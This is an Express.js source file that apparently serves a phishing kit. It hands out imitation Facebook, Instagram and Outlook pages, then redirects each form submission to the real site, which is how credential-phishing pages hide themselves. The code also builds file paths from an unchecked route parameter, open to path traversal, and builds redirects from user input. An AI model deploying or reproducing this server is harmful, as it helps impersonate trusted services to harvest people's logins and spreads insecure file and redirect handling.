const express = require('express');
const path = require('path');
const fs = require('fs').promises;

const app = express();
const PORT = 8080;
const BASE_PATH = path.join(__dirname, 'public');

// Middleware to parse the request body for POST requests
app.use('/static', express.static('public'))
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Route for serving the root
app.get('/', async (req, res) => {
    try {
        const file = await fs.readFile(path.join(BASE_PATH, 'facebook.html'));
        res.send(file.toString());
    } catch (err) {
        const errorFile = await fs.readFile(path.join(BASE_PATH, '404.html'));
        res.status(404).send(errorFile.toString());
    }
});

// Dynamic route to serve specific files (facebook, instagram, outlook)
app.get('/:platform', async (req, res) => {
    let platform = req.params.platform;

    if (platform === 'facebook') {
        platform = 'facebook.html';
    } else if (platform === 'instagram') {
        platform = 'instagram.html';
    } else if (platform === 'outlook') {
        platform = 'outlook.html';
    }

    const filePath = path.join(BASE_PATH, platform);

    try {
        const file = await fs.readFile(filePath);
        res.send(file.toString());
    } catch (err) {
        const errorFile = await fs.readFile(path.join(BASE_PATH, '404.html'));
        res.status(404).send(errorFile.toString());
    }
});

// POST route to handle redirection based on the platform
app.post('/:platform', (req, res) => {
    let platform = req.params.platform;
    let redirectUrl = `https://www.${platform}.com`;

    res.redirect(302, redirectUrl);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
